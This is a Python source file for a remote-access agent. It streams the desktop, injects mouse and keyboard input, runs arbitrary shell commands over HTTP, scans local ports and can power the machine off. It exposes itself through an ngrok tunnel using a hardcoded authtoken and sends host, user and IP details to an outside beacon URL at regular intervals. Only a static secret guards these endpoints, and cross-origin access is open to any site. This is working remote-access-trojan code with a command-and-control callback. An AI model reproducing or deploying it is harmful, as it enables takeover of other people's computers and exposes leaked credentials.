# Axion agent — keep this window open
# python agent.py
# Does NOT hide, does NOT restart itself.

import os
import sys
import time
import json
import io
import hashlib
import base64
import socket
import select
import threading
import subprocess
import platform
import shutil
import zipfile
from queue import Queue, Empty, Full
from datetime import datetime, timezone
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
from urllib.parse import urlparse
from urllib.request import Request, urlopen
from urllib.error import URLError, HTTPError

PORT = 8765
SECRET = "axion-remote-2026"
BEACON_URL = "https://truededsec.netlify.app/api/beacon"
NGROK_TOKEN = "3JatZTgwEJ7ociC1DnwNJjAVtfF_6zXCg5XWXEKy3wR2Xb3sG"

OS_NAME = platform.system()
HOSTNAME = socket.gethostname()
USER = os.getenv("USERNAME") or os.getenv("USER") or "?"
MACHINE_ID = hashlib.sha1((HOSTNAME + "|" + USER).encode()).hexdigest()[:8]
ROOT = os.path.dirname(os.path.abspath(sys.argv[0] if getattr(sys, "frozen", False) else __file__))
TOOLS = os.path.join(ROOT, "tools")

public_url = None
screen_w, screen_h = 1920, 1080
SCAN_PORTS = [21, 22, 23, 25, 53, 80, 110, 135, 139, 443, 445, 3306, 3389, 4040, 5432, 5900, 6080, 6379, 7681, 8000, 8080, 8443, 8765, 9090]


def log(*a):
    print(time.strftime("[%H:%M:%S]"), *a, flush=True)


def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def pip_install(*pkgs):
    subprocess.run([sys.executable, "-m", "pip", "install", *pkgs], timeout=180)


def ensure_deps():
    try:
        import PIL  # noqa: F401
        import mss  # noqa: F401
        import pyautogui  # noqa: F401
        pyautogui.FAILSAFE = False
        pyautogui.PAUSE = 0
        log("deps ok")
        return
    except Exception as e:
        log("installing pillow mss pyautogui because", e)
        pip_install("pillow", "mss", "pyautogui")


def ensure_ngrok():
    os.makedirs(TOOLS, exist_ok=True)
    name = "ngrok.exe" if OS_NAME == "Windows" else "ngrok"
    path = os.path.join(TOOLS, name)
    found = shutil.which("ngrok")
    if found:
        return found
    if os.path.exists(path):
        return path
    if OS_NAME == "Windows":
        url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip"
    elif OS_NAME == "Darwin":
        url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-amd64.zip"
    else:
        url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip"
    zpath = os.path.join(TOOLS, "ngrok.zip")
    log("downloading ngrok")
    req = Request(url, headers={"User-Agent": "axion-agent"})
    with urlopen(req, timeout=90) as r, open(zpath, "wb") as f:
        f.write(r.read())
    with zipfile.ZipFile(zpath, "r") as z:
        z.extractall(TOOLS)
    if OS_NAME != "Windows":
        os.chmod(path, 0o755)
    log("ngrok at", path)
    return path


def start_ngrok(ngrok):
    global public_url
    try:
        subprocess.run([ngrok, "config", "add-authtoken", NGROK_TOKEN], capture_output=True, text=True, timeout=20)
    except Exception as e:
        log("ngrok auth fail", e)
    log("starting ONE ngrok tunnel to", PORT)
    subprocess.Popen([ngrok, "http", str(PORT), "--log=stdout"])
    for i in range(40):
        time.sleep(1)
        try:
            with urlopen("http://127.0.0.1:4040/api/tunnels", timeout=3) as r:
                data = json.loads(r.read().decode())
            for t in data.get("tunnels") or []:
                addr = (t.get("public_url") or "").rstrip("/")
                if addr.startswith("https://"):
                    public_url = addr
                    log("PUBLIC URL", public_url)
                    return public_url
            log("ngrok wait", i)
        except Exception as e:
            log("ngrok api", e)
    log("NO PUBLIC URL")
    return None


# ---------------------------------------------------------------------------
# Screen streaming — a background thread continuously grabs the desktop,
# skips frames that haven't changed (dirty-rect diff) and keeps only the
# newest JPEG in a shared slot. Clients read it at up to STREAM_FPS via
# /stream (multipart MJPEG push) or /screen (single-shot poll).
# ---------------------------------------------------------------------------
STREAM_FPS = 15           # max frames per second pushed to viewers
FRAME_W = 1280            # downscale long edge to this for bandwidth
JPEG_Q_IDLE = 40          # quality when motion is low (smaller frames)
JPEG_Q_MOTION = 62        # quality while there is lots of change
DIRTY_THRESH = 3.2        # mean abs pixel diff above which we send a new frame

_stream_lock = threading.Lock()
_stream_latest = {"jpg": None, "seq": 0}   # newest encoded frame
_stream_event = threading.Event()          # signaled when a new frame lands


def _grab_pil():
    """Grab the full virtual desktop as a PIL RGB image (fast path: mss)."""
    from PIL import Image
    try:
        import mss
        global _mss_inst
        if _mss_inst is None:
            _mss_inst = mss.mss()
        mon = _mss_inst.monitors[0]  # full virtual screen (all monitors)
        shot = _mss_inst.grab(mon)
        return Image.frombytes("RGB", shot.size, shot.bgra, "raw", "BGRX")
    except Exception:
        from PIL import ImageGrab
        return ImageGrab.grab(all_screens=True).convert("RGB")


_mss_inst = None


def _downscale(img):
    w, h = img.size
    if max(w, h) > FRAME_W:
        s = FRAME_W / float(max(w, h))
        img = img.resize((int(w * s), int(h * s)))
    return img


def _encode(img, quality):
    buf = io.BytesIO()
    img.save(buf, format="JPEG", quality=quality)
    return buf.getvalue()


def stream_loop():
    global screen_w, screen_h
    prev_small = None
    log("stream loop started @ %dfps target" % STREAM_FPS)
    while True:
        t0 = time.time()
        try:
            img = _grab_pil()
            screen_w, screen_h = img.size
            small = _downscale(img)
            raw = small.tobytes()
            changed = True
            motion = 0.0
            if prev_small is not None and len(prev_small) == len(raw):
                # cheap dirty check on a tiny thumbnail (fast even on slow CPUs)
                tiny_now = small.resize((64, 36))
                tiny_b = tiny_now.tobytes()
                acc = 0
                for i in range(0, len(tiny_b), 7):  # sample ~1/7 of bytes
                    d = tiny_b[i] - prev_small[i]
                    acc += d if d >= 0 else -d
                motion = acc / (len(range(0, len(tiny_b), 7)) * 255.0) * 100.0
                changed = motion > DIRTY_THRESH
            else:
                tiny_now = small.resize((64, 36))
            if changed:
                q = JPEG_Q_MOTION if motion > 12 else JPEG_Q_IDLE
                jpg = _encode(small, q)
                with _stream_lock:
                    _stream_latest["jpg"] = jpg
                    _stream_latest["seq"] += 1
                _stream_event.set()
                prev_small = tiny_now.tobytes()
        except Exception as e:
            log("stream grab", e)
            time.sleep(0.5)
        dt = time.time() - t0
        time.sleep(max(0.0, 1.0 / STREAM_FPS - dt))
    # note: _stream_event cleared by consumers, see wait_frame()


def wait_frame(seq, timeout=25.0):
    """Block until a frame newer than `seq` exists; return (new_seq, jpeg)."""
    deadline = time.time() + timeout
    while True:
        _stream_event.wait(timeout=max(0.05, deadline - time.time()))
        with _stream_lock:
            cur = _stream_latest["seq"]
            jpg = _stream_latest["jpg"]
        if cur != seq and jpg is not None:
            if cur == _stream_latest["seq"]:
                _stream_event.clear()
            return cur, jpg
        if time.time() > deadline:
            return None, None


def capture_screen():
    """Single-shot capture for polling clients (returns base64 JPEG)."""
    try:
        img = _grab_pil()
        global screen_w, screen_h
        screen_w, screen_h = img.size
        img = _downscale(img)
        buf = io.BytesIO()
        img.save(buf, format="JPEG", quality=60)
        return base64.b64encode(buf.getvalue()).decode()
    except Exception as e:
        log("screen", e)
        return None


def mouse_move(x, y):
    try:
        import pyautogui
        pyautogui.FAILSAFE = False
        pyautogui.moveTo(int(x), int(y))
        return True
    except Exception as e:
        log("move", e)
        return False


def mouse_click(x, y, button="left"):
    try:
        import pyautogui
        pyautogui.FAILSAFE = False
        pyautogui.moveTo(int(x), int(y))
        if button == "right":
            pyautogui.rightClick()
        elif button == "middle":
            pyautogui.click(button="middle")
        else:
            pyautogui.click()
        return True
    except Exception as e:
        log("mouse", e)
        return False


def mouse_down(x, y, button="left"):
    try:
        import pyautogui
        pyautogui.FAILSAFE = False
        pyautogui.moveTo(int(x), int(y))
        pyautogui.mouseDown(button=button if button in ("left", "right", "middle") else "left")
        return True
    except Exception as e:
        log("mdown", e)
        return False


def mouse_up(x=None, y=None, button="left"):
    try:
        import pyautogui
        pyautogui.FAILSAFE = False
        if x is not None and y is not None:
            pyautogui.moveTo(int(x), int(y))
        pyautogui.mouseUp(button=button if button in ("left", "right", "middle") else "left")
        return True
    except Exception as e:
        log("mup", e)
        return False


def mouse_scroll(dx, dy):
    try:
        import pyautogui
        pyautogui.FAILSAFE = False
        amt = int(dy)
        if amt:
            pyautogui.scroll(amt)
        return True
    except Exception as e:
        log("scroll", e)
        return False


def key_event(key, down):
    """Single press/release of one key (modifier names pass through to pyautogui)."""
    try:
        import pyautogui
        pyautogui.FAILSAFE = False
        k = str(key)
        if down:
            pyautogui.keyDown(k)
        else:
            pyautogui.keyUp(k)
        return True
    except Exception as e:
        log("keyev", e)
        return False


def type_text(text):
    try:
        import pyautogui
        pyautogui.FAILSAFE = False
        pyautogui.write(text, interval=0.01)
        return True
    except Exception as e:
        log("type", e)
        return False


def press_key(key):
    try:
        import pyautogui
        pyautogui.FAILSAFE = False
        pyautogui.press(key)
        return True
    except Exception as e:
        log("key", e)
        return False


def run_shell(cmd):
    if not str(cmd).strip():
        return {"error": "empty"}
    try:
        proc = ["powershell", "-NoProfile", "-Command", cmd] if OS_NAME == "Windows" else ["/bin/bash", "-lc", cmd]
        r = subprocess.run(proc, capture_output=True, text=True, timeout=25)
        return {"ok": True, "os": OS_NAME, "stdout": (r.stdout or "")[-8000:], "stderr": (r.stderr or "")[-2000:], "code": r.returncode}
    except Exception as e:
        return {"ok": False, "error": str(e), "os": OS_NAME}


def power_action(action):
    action = (action or "").lower().strip()
    log("POWER", action)
    try:
        if OS_NAME == "Windows":
            if action == "shutdown":
                subprocess.Popen(["shutdown", "/s", "/t", "0"])
            elif action == "restart":
                subprocess.Popen(["shutdown", "/r", "/t", "0"])
            elif action == "sleep":
                subprocess.Popen(["rundll32.exe", "powrprof.dll,SetSuspendState", "0,1,0"])
            else:
                return {"ok": False, "error": "unknown action"}
        elif OS_NAME == "Darwin":
            if action == "shutdown":
                subprocess.Popen(["osascript", "-e", 'tell app "System Events" to shut down'])
            elif action == "restart":
                subprocess.Popen(["osascript", "-e", 'tell app "System Events" to restart'])
            elif action == "sleep":
                subprocess.Popen(["pmset", "sleepnow"])
            else:
                return {"ok": False, "error": "unknown action"}
        else:
            if action == "shutdown":
                subprocess.Popen(["systemctl", "poweroff"])
            elif action == "restart":
                subprocess.Popen(["systemctl", "reboot"])
            elif action == "sleep":
                subprocess.Popen(["systemctl", "suspend"])
            else:
                return {"ok": False, "error": "unknown action"}
        return {"ok": True, "action": action, "os": OS_NAME}
    except Exception as e:
        return {"ok": False, "error": str(e)}


def scan_ports():
    open_ports = []

    def check(p):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.2)
        try:
            if s.connect_ex(("127.0.0.1", p)) == 0:
                open_ports.append(p)
        except Exception:
            pass
        finally:
            s.close()

    ts = [threading.Thread(target=check, args=(p,)) for p in SCAN_PORTS]
    for t in ts:
        t.start()
    for t in ts:
        t.join()
    open_ports.sort()
    return open_ports


def phone_home_once():
    payload = {
        "id": MACHINE_ID,
        "hostname": HOSTNAME,
        "local_ip": get_local_ip(),
        "public_url": public_url or "",
        "api_url": public_url or "",
        "term_url": public_url or "",
        "vnc_url": public_url or "",
        "user": USER,
        "os": OS_NAME,
        "ts": datetime.now(timezone.utc).isoformat(),
        "secret": SECRET,
    }
    log("beacon POST", public_url)
    req = Request(BEACON_URL, data=json.dumps(payload).encode(), headers={"Content-Type": "application/json"}, method="POST")
    try:
        with urlopen(req, timeout=15) as r:
            log("beacon", r.status, r.read().decode())
            return True
    except HTTPError as e:
        log("beacon HTTP", e.code, e.read().decode(errors="replace"))
    except URLError as e:
        log("beacon net", e.reason)
    except Exception as e:
        log("beacon fail", e)
    return False


def phone_loop():
    while True:
        phone_home_once()
        time.sleep(12)


class InputQueue:
    """Serializes ALL mouse/keyboard actions through one worker thread.

    Without this, a burst of /input calls each spawns its own thread and they
    race against pyautogui (stuttery cursor, dropped clicks/keys). One queue +
    one worker = ordered, low-latency control. Coalescing: if many 'move'
    events pile up while the worker is busy, only the newest position is kept.
    """

    def __init__(self, maxsize=256):
        self.q = Queue(maxsize=maxsize)

    def start(self):
        threading.Thread(target=self._run, daemon=True).start()

    def push(self, ev):
        try:
            self.q.put_nowait(ev)
        except Full:
            pass  # drop input rather than block the web server

    def _run(self):
        while True:
            ev = self.q.get()
            # coalesce queued moves: keep only the latest position
            if ev["a"] == "move":
                newer_move = None
                while not self.q.empty():
                    try:
                        nxt = self.q.get_nowait()
                    except Empty:
                        break
                    if nxt["a"] == "move":
                        newer_move = nxt
                    else:
                        # non-move event must still run — put back what we took last
                        if newer_move:
                            try:
                                self.q.put_nowait(newer_move)
                            except Full:
                                pass
                            newer_move = None
                        try:
                            self.q.put_nowait(nxt)
                        except Full:
                            pass
                        break
                if newer_move:
                    ev = newer_move
            self._apply(ev)

    @staticmethod
    def _apply(ev):
        a = ev.get("a")
        x = ev.get("x", 0)
        y = ev.get("y", 0)
        btn = ev.get("button", "left")
        try:
            if a == "move":
                mouse_move(x, y)
            elif a == "click":
                mouse_click(x, y, btn)
            elif a == "down":
                mouse_down(x, y, btn)
            elif a == "up":
                mouse_up(x, y, btn)
            elif a == "scroll":
                mouse_scroll(ev.get("dx", 0), ev.get("dy", 0))
            elif a == "keydown":
                key_event(ev.get("key", ""), True)
            elif a == "keyup":
                key_event(ev.get("key", ""), False)
            elif a == "type":
                type_text(ev.get("text", ""))
            elif a == "key":
                press_key(ev.get("key", ""))
        except Exception as e:
            log("input", a, e)


INPUTQ = InputQueue()


class Handler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"  # enables keep-alive => far lower per-request latency

    def _cors(self):
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type, X-Secret, ngrok-skip-browser-warning")

    def _auth(self):
        return self.headers.get("X-Secret", "") == SECRET

    def do_OPTIONS(self):
        self.send_response(200)
        self._cors()
        self.end_headers()

    def _json(self, obj, code=200):
        raw = json.dumps(obj).encode()
        self.send_response(code)
        self._cors()
        self.send_header("Content-Type", "application/json")
        self.send_header("Cache-Control", "no-store")
        self.send_header("Content-Length", str(len(raw)))
        self.end_headers()
        self.wfile.write(raw)

    def do_GET(self):
        path = urlparse(self.path).path
        if path == "/ping":
            self._json({"ok": True, "id": MACHINE_ID, "os": OS_NAME, "public": public_url, "w": screen_w, "h": screen_h})
            return
        if not self._auth():
            self._json({"error": "forbidden"}, 403)
            return
        if path == "/screen":
            self._json({"img": capture_screen(), "w": screen_w, "h": screen_h})
            return
        if path == "/latest":
            # instant frame pull from the streamer's cache (no grab on this thread)
            with _stream_lock:
                jpg = _stream_latest["jpg"]
                seq = _stream_latest["seq"]
            if jpg is None:
                self._json({"img": capture_screen(), "w": screen_w, "h": screen_h})
                return
            body = b'{"img":"' + base64.b64encode(jpg) + b'","w":%d,"h":%d,"seq":%d}' % (screen_w, screen_h, seq)
            self.send_response(200)
            self._cors()
            self.send_header("Content-Type", "application/json")
            self.send_header("Cache-Control", "no-store")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return
        if path == "/stream":
            self._mjpeg()
            return
        if path in ("/ports", "/scan"):
            self._json({"ok": True, "host": "127.0.0.1", "os": OS_NAME, "open": scan_ports()})
            return
        if path == "/info":
            self._json({"id": MACHINE_ID, "os": OS_NAME, "hostname": HOSTNAME, "user": USER, "local_ip": get_local_ip(), "public_url": public_url})
            return
        self._json({"error": "not found"}, 404)

    def _mjpeg(self):
        """Push MJPEG stream: server keeps the connection open and writes a
        multipart body for every changed frame (up to STREAM_FPS)."""
        self.send_response(200)
        self._cors()
        self.send_header("Content-Type", "multipart/x-mixed-replace; boundary=frame")
        self.send_header("Cache-Control", "no-store")
        self.send_header("Connection", "close")
        self.end_headers()
        seq = 0
        try:
            while True:
                s, jpg = wait_frame(seq)
                if jpg is None:
                    break  # timed out waiting — let client reconnect
                seq = s
                self.wfile.write(b"--frame\r\nContent-Type: image/jpeg\r\nContent-Length: %d\r\n\r\n" % len(jpg))
                self.wfile.write(jpg)
                self.wfile.write(b"\r\n")
        except (BrokenPipeError, ConnectionResetError, OSError):
            pass
        except Exception as e:
            log("mjpeg", e)

    def do_POST(self):
        if not self._auth():
            self._json({"error": "forbidden"}, 403)
            return
        n = int(self.headers.get("Content-Length", 0))
        raw = self.rfile.read(n).decode() if n else "{}"
        try:
            data = json.loads(raw)
        except Exception:
            data = {}
        path = urlparse(self.path).path
        if path == "/mouse":
            # legacy single-shot click — still goes through the ordered queue
            INPUTQ.push({"a": "click", "x": data.get("x", 0), "y": data.get("y", 0),
                         "button": data.get("button", "left")})
            self._json({"ok": True})
        elif path == "/input":
            # batched low-latency input: {events:[{a,x,y,button,key,text,deltaY},...]}
            evs = data.get("events") or [data] if (data.get("events") or data.get("a")) else []
            n = 0
            for ev in evs:
                a = ev.get("a") or ("click" if "x" in ev else None)
                if not a:
                    continue
                e = {"a": a, "x": ev.get("x", 0), "y": ev.get("y", 0),
                     "button": ev.get("button", "left")}
                if "key" in ev:
                    e["key"] = ev["key"]
                if "text" in ev:
                    e["text"] = ev["text"]
                if "deltaY" in ev:
                    e["dy"] = -int(ev["deltaY"] / 100)  # wheel -> pyautogui clicks
                INPUTQ.push(e)
                n += 1
            self._json({"ok": True, "n": n})
        elif path == "/keyboard":
            if data.get("text"):
                INPUTQ.push({"a": "type", "text": data["text"]})
                self._json({"ok": True})
            else:
                ok = press_key(data.get("key", ""))
                self._json({"ok": ok})
        elif path in ("/shell", "/powershell"):
            self._json(run_shell(data.get("cmd", "")))
        elif path == "/power":
            self._json(power_action(data.get("action", "")))
        else:
            self._json({"error": "not found"}, 404)

    def log_message(self, fmt, *args):
        log("http", fmt % args)


class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    daemon_threads = True


def main():
    print("=" * 56)
    print("AXION AGENT — window stays open")
    print("os", OS_NAME, "| host", HOSTNAME, "| user", USER)
    print("=" * 56)
    ensure_deps()
    INPUTQ.start()  # ordered mouse/keyboard worker
    threading.Thread(target=stream_loop, daemon=True).start()  # continuous screen grabber
    srv = ThreadedHTTPServer(("0.0.0.0", PORT), Handler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    log("api http://127.0.0.1:%s" % PORT)
    try:
        ng = ensure_ngrok()
        start_ngrok(ng)
    except Exception as e:
        log("ngrok fatal", e)
    if phone_home_once():
        log("OPEN https://truededsec.netlify.app/  password 0000")
        log("Refresh, click this PC, control from the page")
    else:
        log("beacon failed — site will not list this PC")
    threading.Thread(target=phone_loop, daemon=True).start()
    log("running. close this window to stop.")
    try:
        while True:
            time.sleep(20)
            log("alive", public_url or "(no url)")
    except KeyboardInterrupt:
        log("stopped")


if __name__ == "__main__":
    main()
